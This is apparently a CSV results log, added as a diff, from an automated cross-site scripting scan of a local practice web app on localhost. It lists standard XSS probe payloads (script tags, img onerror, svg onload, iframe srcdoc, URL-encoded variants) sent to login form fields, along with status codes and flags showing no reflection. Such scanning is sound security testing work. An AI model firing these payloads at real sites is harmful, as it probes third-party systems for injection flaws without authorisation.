+http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
+http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
+http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
+http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,303,303
+http://localhost:8080/vulnerabilities/fi/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,303,303
